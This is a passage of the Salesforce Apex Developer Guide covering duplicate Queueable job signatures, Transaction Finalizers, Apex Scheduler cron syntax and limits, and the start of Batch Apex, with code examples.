Reduce resource contention and race conditions by enqueuing only a single instance of your async Queueable job based on its
signature. Attempting to add more than one Queueable job to the processing queue with the same signature results in a
DuplicateMessageException when you try to enqueue subsequent jobs.

Transaction Finalizers
The Transaction Finalizers feature enables you to attach actions, using the `System.Finalizer` interface, to asynchronous Apex
jobs that use the Queueable framework. A specific use case is to design recovery actions when a Queueable job fails.

Transaction Finalizers Error Messages
Troubleshoot both semantic and run-time issues by analyzing these error messages.

SEE ALSO:

_Apex Reference Guide_ [: Queueable Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Queueable.htm)

_Apex Reference Guide_ [: QueueableContext Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_interface_system_queueablecontext.htm)

###### Detecting Duplicate Queueable Jobs

Reduce resource contention and race conditions by enqueuing only a single instance of your async Queueable job based on its signature.
Attempting to add more than one Queueable job to the processing queue with the same signature results in a DuplicateMessageException
when you try to enqueue subsequent jobs.

Build a Queueable Signature

To create a unique queuable signature, first declare an instance of the `[AsyncOptions](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_AsyncOptions.htm)` class. Then set the value of the instance’s
`DuplicateSignature` property to a `[QueueableDuplicateSignature](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_QueueableDuplicateSignature.htm)` object, which is built using the inner
`[QueueableDuplicateSignature.Builder](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_QueueableDuplicateSignature_Builder.htm)` class.

To build the queueable signature, add different strings, IDs, or integers using these methods from
`QueueableDuplicateSignature.Builder` .

**•** `addString(inputString)`

**•** `addId(inputId)`

**•** `addInteger(inputInteger)`

As you build the signature, you can find the size, remaining size, and maximum size of the queueable job signature in bytes using these
methods from the `QueueableDuplicateSignature.Builder` class.

**•** `getSize()`

**•** `getRemainingSize()`

**•** `getMaxSize()`

When the signature has the required components, call the `.build()` method and assign the signature to the
`DuplicateSignature` property.

Enqueue a Job with a Queueable Signature

After you build a queuable signature, enqueue a new job using the `[System.enqueueJob(queueable, asyncOptions)](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm#apex_System_system_enqueueJob)`
method. Set the `asyncOptions` parameter to the `AsyncOptions` instance with the queueable signature that identifies the
unique job. When the new job is enqueued, the system checks for existing enqueued jobs with the same signature. If other enqueued
jobs with the same signature are found, then the enqueue operation for the new job fails, and a DuplicateMessageException is thrown.


Apex Developer Guide Invoking Apex

However, if other jobs with the same signature are already running when the new job is enqueued, then the enqueue operation for the
new job succeeds. Therefore, duplicates of already running jobs can still occur in this case. This behavior occurs because the queuable
signature is removed from the job when it’s first dequeued, so a running job no longer has a signature. This removal guarantees that at
least one job instance for a given signature runs.

Examples

This example builds the async job signature using the User Id and the string `MyQueueable` .

```
   AsyncOptions options = new AsyncOptions();

   options.DuplicateSignature = QueueableDuplicateSignature.Builder()

                       .addId(UserInfo.getUserId())

                       .addString('MyQueueable')

                       .build();

   try {

      System.enqueueJob(new MyQueueable(), options);

   } catch (DuplicateMessageException ex) {

      //Exception is thrown if there is already an enqueued job with the same

      //signature

      Assert.areEqual('Attempt to enqueue job with duplicate queueable signature',

        ex.getMessage());

   }

```

This example builds the async job signature using the ApexClass Id and the hash value of an sObject.

```
   AsyncOptions options = new AsyncOptions();

   options.DuplicateSignature = QueueableDuplicateSignature.Builder()

                       .addInteger(System.hashCode(someAccount))

                       .addId([SELECT Id FROM ApexClass

                          WHERE Name='MyQueueable'].Id)

                       .build();

   System.enqueueJob(new MyQueueable(), options);

###### Transaction Finalizers

```

The Transaction Finalizers feature enables you to attach actions, using the `System.Finalizer` interface, to asynchronous Apex
jobs that use the Queueable framework. A specific use case is to design recovery actions when a Queueable job fails.

The Transaction Finalizers feature provides a direct way for you to specify actions to be taken when asynchronous jobs succeed or fail.
Before Transaction Finalizers, you could only take these two actions for asynchronous job failures:

**•** Poll the status of `AsyncApexJob` using a SOQL query and re-enqueue the job if it fails

**•** Fire BatchApexErrorEvents when a batch Apex method encounters an unhandled exception

With transaction finalizers, you can attach a post-action sequence to a Queueable job and take relevant actions based on the job execution
result.

A Queueable job that failed due to an unhandled exception can be successively re-enqueued five times by a transaction finalizer. This
limit applies to a series of consecutive Queueable job failures. The counter is reset when the Queueable job completes without an
unhandled exception.

Finalizers can be implemented as an inner class. Also, you can implement both Queueable and Finalizer interfaces with the same class.

The Queueable job and the Finalizer run in separate Apex and Database transactions. For example, the Queueable can include DML, and
the Finalizer can include REST callouts. Using a finalizer doesn’t count as an extra execution against your daily Async Apex limit. Synchronous
governor limits apply for the Finalizer transaction, except in these cases where asynchronous limits apply:


Apex Developer Guide Invoking Apex

**•** Total heap size

**•** Maximum number of Apex jobs added to the queue with `System.enqueueJob`

**•** Maximum number of methods with the `future` annotation allowed per Apex invocation

For more information on governor limits, see Execution Governors and Limits.

System.Finalizer Interface

The `System.Finalizer` interface includes the `execute` method:

```
   global void execute(System.FinalizerContext ctx ) {}

```

This method is called on the provided Finalizer instance for every enqueued job with a finalizer attached. Within the `execute` method,
you can define the actions to be taken at the end of the Queueable job. An instance of `System.FinalizerContext` is injected
by the Apex runtime engine as an argument to the `execute` method.

System.FinalizerContext Interface

The `System.FinalizerContext` interface contains four methods.

**•** `getAsyncApexJobId` method:

```
     global Id getAsyncApexJobId {}

```

Returns the ID of the Queueable job for which this finalizer is defined.

**•** `getRequestId` method:

```
     global String getRequestId {}

```

Returns the request ID, a string that uniquely identifies the request, and can be correlated with Event Monitoring logs. To correlate
with the AsyncApexJob table, use the `getAsyncApexJobId` method instead. The Queueable job and the Finalizer execution
both share the (same) request ID.

**•** `getResult` method:

```
     global System.ParentJobResult getResult {}

```

Returns the `System.ParentJobResult` enum, which represents the result of the parent asynchronous Apex Queueable job
to which the finalizer is attached. The enum takes these values: `SUCCESS`, `UNHANDLED_EXCEPTION` .

**•** `getException` method:

```
     global System.Exception getException {}

```

Returns the exception with which the Queueable job failed when `getResult` is `UNHANDLED_EXCEPTION`, null otherwise.

Attach the finalizer to your Queueable jobs using the `System.attachFinalizer` method.

**1.** Define a class that implements the `System.Finalizer` interface.

**2.** Attach a finalizer within a Queueable job’s `execute` method. To attach the finalizer, invoke the `System.attachFinalizer`
method, using as argument the instantiated class that implements the System.Finalizer interface.

```
     global void attachFinalizer(Finalizer finalizer) {}

```

Implementation Details

**•** Only one finalizer instance can be attached to any Queueable job.


Apex Developer Guide Invoking Apex

**•** You can enqueue a single asynchronous Apex job (Queueable, Future, or Batch) in the finalizer’s implementation of the `execute`
method.

**•** Callouts are allowed in finalizer implementations.

**•** The Finalizer framework uses the state of the Finalizer object (if attached) at the end of Queueable execution. Mutation of the Finalizer
state, after it’s attached, is therefore supported.

**•** Variables that are declared `transient` are ignored by serialization and deserialization, and therefore don’t persist in the Transaction
Finalizer.

Logging Finalizer Example

This example demonstrates the use of Transaction Finalizers in logging messages from a Queueable job, regardless of whether the job
succeeds or fails. The LoggingFinalizer class here implements both Queueable and Finalizer interfaces. The Queueable implementation
instantiates the finalizer, attaches it, and then invokes the addLog() method to buffer log messages. The Finalizer implementation of
LoggingFinalizer includes the addLog(message, source) method that allows buffering log messages from the Queueable job into finalizer's
state. When the Queueable job completes, the finalizer instance commits the buffered log. The finalizer state is preserved even if the
Queueable job fails, and can be accessed for use in DML in finalizer implementation or execution.

```
   public class LoggingFinalizer implements Finalizer, Queueable {

     // Queueable implementation

     // A queueable job that uses LoggingFinalizer to buffer the log

     // and commit upon exit, even if the queueable execution fails

      public void execute(QueueableContext ctx) {

        String jobId = '' + ctx.getJobId();

        System.debug('Begin: executing queueable job: ' + jobId);

        try {

           // Create an instance of LoggingFinalizer and attach it

           // Alternatively, System.attachFinalizer(this) can be used instead of

   instantiating LoggingFinalizer

           LoggingFinalizer f = new LoggingFinalizer();

           System.attachFinalizer(f);

           // While executing the job, log using LoggingFinalizer.addLog()

           // Note that addlog() modifies the Finalizer's state after it is attached

           DateTime start = DateTime.now();

           f.addLog('About to do some work...', jobId);

           while (true) {

            // Results in limit error

           }

        } catch (Exception e) {

           System.debug('Error executing the job [' + jobId + ']: ' + e.getMessage());

        } finally {

           System.debug('Completed: execution of queueable job: ' + jobId);

        }

      }

     // Finalizer implementation

    // Logging finalizer provides a public method addLog(message,source) that allows buffering

    log lines from the Queueable job.

    // When the Queueable job completes, regardless of success or failure, the LoggingFinalizer

```


Apex Developer Guide Invoking Apex

```
    instance commits this buffered log.

     // Custom object LogMessage__c has four custom fields-see addLog() method.

      // internal log buffer

      private List<LogMessage__c> logRecords = new List<LogMessage__c>();

      public void execute(FinalizerContext ctx) {

        String parentJobId = ctx.getAsyncApexJobId();

       System.debug('Begin: executing finalizer attached to queueable job: ' + parentJobId);

        // Update the log records with the parent queueable job id

        System.Debug('Updating job id on ' + logRecords.size() + ' log records');

        for (LogMessage__c log : logRecords) {

           log.Request__c = parentJobId; // or could be ctx.getRequestId()

        }

        // Commit the buffer

        System.Debug('committing log records to database');

        Database.insert(logRecords, false);

        if (ctx.getResult() == ParentJobResult.SUCCESS) {

           System.debug('Parent queueable job [' + parentJobId + '] completed

   successfully.');

        } else {

          System.debug('Parent queueable job [' + parentJobId + '] failed due to unhandled

    exception: ' + ctx.getException().getMessage());

           System.debug('Enqueueing another instance of the queueable...');

        }

        System.debug('Completed: execution of finalizer attached to queueable job: ' +

   parentJobId);

      }

      public void addLog(String message, String source) {

        // append the log message to the buffer

        logRecords.add(new LogMessage__c(

           DateTime__c = DateTime.now(),

           Message__c = message,

           Request__c = 'setbeforecommit',

           Source__c = source

        ));

      }

   }

```

Retry Queueable Example

This example demonstrates how to re-enqueue a failed Queueable job in its finalizer. It also shows that jobs can be re-enqueued up to
a queueable chaining limit of 5 retries.

```
   public class RetryLimitDemo implements Finalizer, Queueable {

     // Queueable implementation

     public void execute(QueueableContext ctx) {

```


Apex Developer Guide Invoking Apex

```
      String jobId = '' + ctx.getJobId();

      System.debug('Begin: executing queueable job: ' + jobId);

      try {

        Finalizer finalizer = new RetryLimitDemo();

        System.attachFinalizer(finalizer);

        System.debug('Attached finalizer');

        Integer accountNumber = 1;

        while (true) { // results in limit error

         Account a = new Account();

         a.Name = 'Account-Number-' + accountNumber;

         insert a;

         accountNumber++;

        }

      } catch (Exception e) {

        System.debug('Error executing the job [' + jobId + ']: ' + e.getMessage());

      } finally {

        System.debug('Completed: execution of queueable job: ' + jobId);

      }

     }

     // Finalizer implementation

     public void execute(FinalizerContext ctx) {

      String parentJobId = '' + ctx.getAsyncApexJobId();

      System.debug('Begin: executing finalizer attached to queueable job: ' + parentJobId);

      if (ctx.getResult() == ParentJobResult.SUCCESS) {

        System.debug('Parent queueable job [' + parentJobId + '] completed successfully.');

      } else {

        System.debug('Parent queueable job [' + parentJobId + '] failed due to unhandled

   exception: ' + ctx.getException().getMessage());

        System.debug('Enqueueing another instance of the queueable...');

        String newJobId = '' + System.enqueueJob(new RetryLimitDemo()); // This call fails

    after 5 times when it hits the chaining limit

        System.debug('Enqueued new job: ' + newJobId);

      }

      System.debug('Completed: execution of finalizer attached to queueable job: ' +

   parentJobId);

     }

   }

```

Considerations

If a job request is terminated unexpectedly, such as a database shutdown during system upgrade, the transaction finalizer can fail to
execute.

Best Practices

We urge ISVs to exercise caution in using global Finalizers with state-mutating methods in packages. If a subscriber org’s implementation
invokes such methods in the global Finalizer, it can result in unexpected behavior. Examine all state-mutating methods to see how they
affect the finalizer state and overall behavior.


Apex Developer Guide Invoking Apex

###### Transaction Finalizers Error Messages

Troubleshoot both semantic and run-time issues by analyzing these error messages.

This table provides information about error messages in your Apex debug log.

**Table 5: Troubleshooting Errors in Apex Debug Log**

[If you have a Splunk Add-On for Salesforce, you can analyze error messages in your Splunk log. This table provides information about](https://splunkbase.splunk.com/)
error messages in the Splunk log.

**Table 6: Troubleshooting Errors in Splunk Log**

##### Apex Scheduler

Use the Apex Scheduler to delay execution so that you can run Apex classes at a specified time. This is ideal for daily or weekly maintenance
tasks using Batch Apex.

To invoke Apex classes to run at specific times, first implement the `Schedulable` interface for the class, then specify the schedule
using either the Schedule Apex page in the Salesforce user interface, or the `System.schedule` method.


Apex Developer Guide Invoking Apex

Important: Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service
availability.

You can only have 100 scheduled Apex jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs
page in Salesforce and creating a custom view with a type filter equal to “Scheduled Apex”. You can also programmatically query
the CronTrigger and CronJobDetail objects to get the count of Apex scheduled jobs.

Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t add
more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the
user interface, and all cases where more than one record can be updated at a time.

If there are one or more active scheduled jobs for an Apex class, you can’t update the class or any classes referenced by this class
through the Salesforce user interface. However, you can enable deployments to update the class with active scheduled jobs by
using the Metadata API (for example, when using the Salesforce extensions for Visual Studio Code). See “Deployment Connections
for Change Sets” in Salesforce Help.

Implementing the **`Schedulable`** Interface

To schedule an Apex class to run at regular intervals, first write an Apex class that implements the Salesforce-provided interface
`Schedulable` .

The scheduler runs as system—all classes are executed, whether the user has permission to execute the class or not.

To monitor or stop the execution of a scheduled Apex job using the Salesforce user interface, from Setup, enter _`Scheduled Jobs`_
in the `Quick Find` box, then select **Scheduled Jobs** .

The `Schedulable` interface contains one `execute` method that must be implemented.

```
   public void execute(SchedulableContext sc ){}

```

The implemented method must be declared as `global` or `public` .

Use this method to instantiate the class you want to schedule.

Tip: Though it’s possible to do additional processing in the `execute` method, we recommend that all processing take place
in a separate class.

This example implements the `Schedulable` interface for a class called `MergeNumbers` :

```
   public with sharing class ScheduledMerge implements Schedulable {

     public void execute(SchedulableContext SC) {

       MergeNumbers M = new MergeNumbers();

     }

   }

```

To schedule the class, execute this example in the Developer Console.

```
   ScheduledMerge m = new ScheduledMerge();

   String sch = '20 30 8 10 2 ?';

   String jobID = System.schedule('Merge Job', sch, m);

```

You can also use the `Schedulable` interface with batch Apex classes. The following example illustrates how to implement the
`Schedulable` interface for a batch Apex class called `Batchable` :

```
   public with sharing class ScheduledBatchable implements Schedulable {

     global void execute(SchedulableContext sc) {

       Batchable b = new Batchable();

       Database.executeBatch(b);

```


Apex Developer Guide Invoking Apex

```
     }

   }

```

An easier way to schedule a batch job is to call the `[System.scheduleBatch](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_batch_interface.htm#apex_batch_scheduleBatch_section)` method without having to implement the
`Schedulable` interface.

Use the SchedulableContext object to track the scheduled job when it's scheduled. The SchedulableContext `getTriggerID` method
[returns the ID of the CronTrigger object associated with this scheduled job as a string. You can query](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_crontrigger.htm) `CronTrigger` to track the
progress of the scheduled job.

To stop execution of a job that was scheduled, use the `System.abortJob` method with the ID returned by the `getTriggerID`
method.

Tracking the Progress of a Scheduled Job Using Queries

After the Apex job has been scheduled, you can obtain more information about it by running a SOQL query on CronTrigger. You can
retrieve the number of times the job has run, and the date and time when the job is scheduled to run again, as shown in this example.

```
   CronTrigger ct =

      [SELECT TimesTriggered, NextFireTime

      FROM CronTrigger WHERE Id = :jobID WITH USER_MODE];

```

The previous example assumes you have a `jobID` variable holding the ID of the job. The `System.schedule` method returns the
job ID. If you’re performing this query inside the `execute` method of your schedulable class, you can obtain the ID of the current job
by calling `getTriggerId` on the SchedulableContext argument variable. Assuming this variable name is `sc`, the modified example
becomes:

```
   CronTrigger ct =

      [SELECT TimesTriggered, NextFireTime

      FROM CronTrigger WHERE Id = :sc.getTriggerId() WITH USER_MODE];

```

You can also get the job’s name and the job’s type from the CronJobDetail record associated with the CronTrigger record. To do so, use
the `CronJobDetail` relationship when performing a query on CronTrigger. This example retrieves the most recent CronTrigger
record with the job name and type from CronJobDetail.

```
   CronTrigger job =

      [SELECT Id, CronJobDetail.Id, CronJobDetail.Name, CronJobDetail.JobType

      FROM CronTrigger WITH USER_MODE ORDER BY CreatedDate DESC LIMIT 1];

```

Alternatively, you can query CronJobDetail directly to get the job’s name and type. This next example gets the job’s name and type for
the CronTrigger record queried in the previous example. The corresponding CronJobDetail record ID is obtained by the
`CronJobDetail.Id` expression on the CronTrigger record.

```
   CronJobDetail ctd =

      [SELECT Id, Name, JobType

      FROM CronJobDetail WHERE Id = :job.CronJobDetail.Id WITH USER_MODE];

```

To obtain the total count of all Apex scheduled jobs, excluding all other scheduled job types, perform the this query. Note the value '7'
is specified for the job type, which corresponds to the scheduled Apex job type.

```
   SELECT COUNT() FROM CronTrigger WHERE CronJobDetail.JobType = '7' WITH USER_MODE

```

Testing the Apex Scheduler

Here’s an example of how to test using the Apex scheduler.


Apex Developer Guide Invoking Apex

The `System.schedule` method starts an asynchronous process. When you test scheduled Apex, you must ensure that the scheduled
job is finished before testing against the results. Use the Test methods `startTest` and `stopTest` around the `System.schedule`
method to ensure it finishes before continuing your test. All asynchronous calls made after the `startTest` method are collected by
the system. When `stopTest` is executed, all asynchronous processes are run synchronously. If you don’t include the
`System.schedule` method within the `startTest` and `stopTest` methods, the scheduled job executes at the end of your
test method for Apex saved using Salesforce API version 25.0 and later, but not in earlier versions.

This example defines a class to be tested.

```
   public with sharing class TestScheduledApexFromTestMethod implements Schedulable {

   // This test runs a scheduled job at midnight Sept. 3rd. 2042

     public static String CRON_EXP = '0 0 0 3 9 ? 2042';

     public void execute(SchedulableContext ctx) {

       CronTrigger ct = [SELECT Id, CronExpression, TimesTriggered, NextFireTime

             FROM CronTrigger WHERE Id = :ctx.getTriggerId() WITH USER_MODE];

       Assert.areEqual(CRON_EXP, ct.CronExpression);

       Assert.areEqual(0, ct.TimesTriggered);

       Assert.areEqual('2042-09-03 00:00:00', String.valueOf(ct.NextFireTime));

       Account a = [SELECT Id, Name FROM Account WHERE Name =

              'testScheduledApexFromTestMethod' WITH USER_MODE];

       a.name = 'testScheduledApexFromTestMethodUpdated';

       update as user a;

     }

   }

```

This code tests the class:

```
   @IsTest

   private with sharing class TestClass {

     @IsTest

     static void test() {

      Test.startTest();

      Account a = new Account();

      a.Name = 'testScheduledApexFromTestMethod';

      insert as user a;

      // Schedule the test job

      String jobId = System.schedule(

       'testBasicScheduledApex',

       TestScheduledApexFromTestMethod.CRON_EXP,

       new TestScheduledApexFromTestMethod()

      );

      // Get the information from the CronTrigger API object

      CronTrigger ct = [

       SELECT Id, CronExpression, TimesTriggered, NextFireTime

       FROM CronTrigger

       WHERE Id = :jobId

```


Apex Developer Guide Invoking Apex

```
       WITH USER_MODE

      ];

      // Verify the expressions are the same

      Assert.areEqual(

       TestScheduledApexFromTestMethod.CRON_EXP,

       ct.CronExpression

      );

      // Verify the job has not run

      Assert.areEqual(0, ct.TimesTriggered);

      // Verify the next time the job will run

      Assert.areEqual('2042-09-03 00:00:00', String.valueOf(ct.NextFireTime));

      Assert.areNotEqual(

       'testScheduledApexFromTestMethodUpdated',

       [SELECT Id, Name FROM Account WHERE Id = :a.Id WITH USER_MODE].Name

      );

      Test.stopTest();

      Assert.areEqual(

       'testScheduledApexFromTestMethodUpdated',

       [SELECT Id, Name FROM Account WHERE Id = :a.Id WITH USER_MODE].Name

      );

     }

   }

```

Using the **`System.schedule`** Method

After you implement a class with the `Schedulable` interface, use the `System.schedule` method to execute it. The scheduler
runs as system—all classes are executed, whether the user has permission to execute the class or not.

Note: Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t
add more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through
the user interface, and all cases where more than one record can be updated at a time.

The `System.schedule` method takes three arguments: a name for the job, a cron expression used to represent the time and date
the job is scheduled to run, and the name of the class.

The name for the job must be unique among the jobs scheduled for execution. If you attempt to schedule another job with the same
name, you see the error `System.AsyncException: The Apex job named "` _`jobName`_ `" is already scheduled`
`for execution` .

The cron expression has this syntax:

```
   Seconds Minutes Hours Day_of_month Month Day_of_week Optional_year

```

Note: Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service
availability.

The `System.schedule` method uses the user's time zone as the basis of all schedules.

These are the values for the expression:


Apex Developer Guide Invoking Apex

**Name** **Values** **Special Characters**

_`Seconds`_ 0–59 None

_`Minutes`_ 0–59 None

_`Hours`_ 0–23 `, - * /`

_`Day_of_month`_ 1–31 `, - * ? / L W`

_`Month`_ 1–12 or the following: `, - * /`

**•** `JAN`

**•** `FEB`

**•** `MAR`

**•** `APR`

**•** `MAY`

**•** `JUN`

**•** `JUL`

**•** `AUG`

**•** `SEP`

**•** `OCT`

**•** `NOV`

**•** `DEC`

_`Day_of_week`_ 1–7 or the following: `, - * ? / L #`

**•** `SUN`

**•** `MON`

**•** `TUE`

**•** `WED`

**•** `THU`

**•** `FRI`

**•** `SAT`

_`optional_year`_ null or 1970–2099 `, - * /`

The special characters are defined as follows:

**Special Character** **Description**

`,` Delimits values. For example, use `JAN, MAR, APR` to specify more than one month.

`-` Specifies a range. For example, use `JAN-MAR` to specify more than one month.

`*` Specifies all values. For example, if _`Month`_ is specified as `*`, the job is scheduled for
every month.


Apex Developer Guide Invoking Apex

**Special Character** **Description**

`?` Specifies no specific value. This option is only available for _`Day_of_month`_ and
_`Day_of_week`_ . It’s typically used when specifying a value for one and not the other.

`/` Specifies increments. The number before the slash specifies when the intervals will
begin, and the number after the slash is the interval amount. For example, if you specify

`1/5` for _`Day_of_month`_, the Apex class runs every fifth day of the month, starting
on the first of the month.

`L` Specifies the end of a range (last). This option is only available for _`Day_of_month`_
and _`Day_of_week`_ . When used with _`Day of month`_, `L` always means the last

day of the month, such as January 31, February 29 (for leap years), and so on. When
used with _`Day_of_week`_ by itself, it always means `7` or `SAT` . When used with a
_`Day_of_week`_ value, it means the last of that type of day in the month. For example,
if you specify `2L`, you’re specifying the last Monday of the month. Don’t use a range
of values with `L` as the results can be unexpected.

`W` Specifies the nearest weekday (Monday-Friday) of the given day. This option is only
available for _`Day_of_month`_ . For example, if you specify `20W`, and the 20th is a

Saturday, the class runs on the 19th. If you specify `1W`, and the first is a Saturday, the
class doesn’t run in the previous month, but on the third, which is the following
Monday.

Tip: Use the `L` and `W` together to specify the last weekday of the month.

`#` Specifies the _`nth`_ day of the month, in the format _**`weekday`**_ `#` _**`day_of_month`**_ .
This option is only available for _`Day_of_week`_ . The number before the `#` specifies

weekday ( `SUN-SAT` ). The number after the `#` specifies the day of the month. For
example, specifying `2#1` means the class runs on the first Monday of every month.

The following are some examples of how to use the expression.

**Expression** **Description**

`0 0 13 * * ?` The class runs every day at 1 PM.

`0 5 * * * ?` The class runs every hour at 5 minutes past the hour.

Note: Apex doesn’t allow for a job to be scheduled more
than once an hour.

`0 0 22 ? * 6L` The class runs on the last Friday of every month at 10 PM.

`0 0 10 ? * MON-FRI` The class runs Monday through Friday at 10 AM.

`0 0 20 * * ? 2010` The class runs every day at 8 PM during the year 2010.


Apex Developer Guide Invoking Apex

In the following example, the class `Proschedule` implements the `Schedulable` interface. The class is scheduled to run at 8 AM
on the 13 February.

```
   Proschedule p = new Proschedule();

        String sch = '0 0 8 13 2 ?';

        System.schedule('One Time Pro', sch, p);

```

Using the **`System.scheduleBatch`** Method for Batch Jobs

You can call the `System.scheduleBatch` method to schedule a batch job to run one time at a specified time in the future. This
method is available only for batch classes and doesn’t require the implementation of the `Schedulable` interface. It’s therefore easy
to schedule a batch job for one execution. For more details on how to use the `System.scheduleBatch` method, see Using the
`System.scheduleBatch` Method.

Apex Scheduler Limits

**•** You can only have 100 scheduled Apex jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs page
in Salesforce and creating a custom view with a type filter equal to “Scheduled Apex”. You can also programmatically query the
CronTrigger and CronJobDetail objects to get the count of Apex scheduled jobs.

**•** The maximum number of scheduled Apex executions per a 24-hour period is 250,000 or the number of user licenses in your
organization multiplied by 200, whichever is greater. This limit is for your entire org and is shared with all asynchronous Apex: Batch
Apex, Queueable Apex, scheduled Apex, and future methods. To check how many asynchronous Apex executions are available,
make a request to REST API `limits` [resource. See List Organization Limits in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/dome_limits.htm) _REST API Developer Guide_ . If the number of
asynchronous Apex executions needed by a job exceeds the available number that’s calculated using the 24-hour rolling limit, an
exception is thrown. For example, if your async job requires 10,000 method executions and the available 24-hour rolling limit is
9,500, you get AsyncApexExecutions Limit exceeded exception. The license types that count toward this limit include full Salesforce
and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company Communities
users.

Apex Scheduler Notes and Best Practices

**•** Salesforce schedules the class for execution at the specified time. Actual execution can be delayed based on service availability.

**•** Use extreme care if you’re planning to schedule a class from a trigger. You must be able to guarantee that the trigger won’t add
more scheduled classes than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the
user interface, and all cases where more than one record can be updated at a time.

**•** Though it's possible to do additional processing in the `execute` method, we recommend that all processing must take place in
a separate class.

**•** Synchronous Web service callouts aren’t supported from scheduled Apex. To make asynchronous callouts, use Queueable Apex,
implementing the `Database.AllowsCallouts` marker interface. If your scheduled Apex executes a batch job using the
`Database.AllowsCallouts` marker interface, callouts are supported from the batch class. See Using Batch Apex.

**•** Apex jobs scheduled to run during a Salesforce service maintenance downtime will be scheduled to run after the service comes
back up, when system resources become available. If a scheduled Apex job was running when downtime occurred, the job is rolled
back and scheduled again after the service comes back up. After major service upgrades, there can be longer delays than usual for
starting scheduled Apex jobs because of system usage spikes.

**•** When you refresh a sandbox, scheduled jobs from the source org aren't copied. You must reschedule any jobs that you need in the
refreshed sandbox.

**•** Scheduled job objects, along with their member variables and properties, persist from initialization to subsequent scheduled runs.
The object state at the time of invocation of `System.schedule()` persists in subsequent job executions.


Apex Developer Guide Invoking Apex

With Batch Apex, it’s possible to force a new serialized state for new jobs by using `Database.Stateful` . With Scheduled Apex,
use the `transient` keyword so that member variables and properties aren’t persisted. See Using the transient Keyword on page
89..

**•** If you attempt to deploy changes to a class or its dependent code when the class is scheduled for execution, you see the error `This`
`schedulable class has jobs pending or in progress - CronTrigger IDs (` _`ids`_ `)` . You can also
see the message `You can bypass this error by allowing deployments with Apex jobs in the`
`Deployment Settings page in Setup.` If you enable this setting, be aware that the job can fail. Instead, we recommend
that you first delete the scheduled job, and then deploy your changes. After deployment, create a new scheduled job with the
updated class.

**•** If you resume a paused scheduled job, the job immediately runs one time. Subsequent executions of the job run according to the
established schedule. Any scheduled executions that were missed while the job was paused don’t run.

SEE ALSO:

_Apex Reference Guide_ [: Schedulable Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_interface_system_schedulable.htm)

##### Batch Apex

A developer can now employ batch Apex to build complex, long-running processes that run on thousands of records on the Lightning
Platform. Batch Apex operates over small batches of records, covering your entire record set and breaking the processing down to
manageable chunks. For example, a developer could build an archiving solution that runs on a nightly basis, looking for records past a
certain date and adding them to an archive. Or a developer could build a data cleansing operation that goes through all Accounts and
Opportunities on a nightly basis and updates them if necessary, based on custom criteria.

##### Batch Apex is exposed as an interface that must be implemented by the developer. Batch jobs can be programmatically invoked at

runtime using Apex.

You can only have five queued or active batch jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs
page in Salesforce or programmatically using SOAP API to query the `AsyncApexJob` object.

Warning: Use extreme care if you are planning to invoke a batch job from a trigger. You must be able to guarantee that the
trigger does not add more batch jobs than the limit. In particular, consider API bulk updates, import wizards, mass record changes
through the user interface, and all cases where more than one record can be updated at a time.

Batch jobs can also be programmatically scheduled to run at specific times using the Apex scheduler, or scheduled using the Schedule
Apex page in the Salesforce user interface. For more information on the Schedule Apex page, see “Schedule Apex Jobs” in the Salesforce
online help.

The batch Apex interface is also used for Apex managed sharing recalculations.

For more information on batch jobs, continue to Using Batch Apex on page 307.

For more information on Apex managed sharing, see Understanding Apex Managed Sharing on page 224.

For more information on firing platform events from batch Apex, see Firing Platform Events from Batch Apex

Use Batch Apex
To use batch Apex, write an Apex class that implements the Salesforce-provided interface `Database.Batchable` and then
invoke the class programmatically. To monitor or stop the execution of the batch Apex job, from Setup, enter _`Apex Jobs`_ in the
Quick Find box and then select **Apex Jobs** .


Apex Developer Guide Invoking Apex

Firing Platform Events from Batch Apex
Batch Apex classes can fire platform events when encountering an error or exception. Clients listening on an event can obtain
actionable information, such as how often the event failed and which records were in scope at the time of failure. Events are also
fired for Salesforce Platform internal errors and other uncatchable Apex exceptions such as LimitExceptions, which are caused by
reaching governor limits.

###### Use Batch Apex

To use batch Apex, write an Apex class that implements the Salesforce-provided interface `Database.Batchable` and then invoke
the class programmatically. To monitor or stop the execution of the batch Apex job, from Setup, enter _`Apex Jobs`_ in the Quick Find
box and then select **Apex Jobs** .

Implement the **`Database.Batchable`** Interface

The `Database.Batchable` interface contains three methods that must be implemented.

**•** `start` method:

```
     public (Database.QueryLocator | Iterable<sObject>) start(Database.BatchableContext bc )

      {}

```

The `start` method is called at the beginning of a batch Apex job. In the `start` method, you can include code that collects
records or objects to pass to the interface method `execute` . This method returns either a `Database.QueryLocator` object
or an iterable that contains the records or objects passed to the job.

When you’re using a simple query ( `SELECT` ) to generate the scope of objects in the batch job, use the
`Database.QueryLocator` object. If you use a `QueryLocator` object, the governor limit for the total number of records
retrieved by SOQL queries is bypassed. For example, a batch Apex job for the Account object can return a `QueryLocator` for all
account records (up to 50 million records) in an org. Another example is a sharing recalculation for the Contact object that returns
a `QueryLocator` for all account records in an org.

Use the iterable to create a complex scope for the batch job. You can also use the iterable to create your own custom process for
iterating through the list.

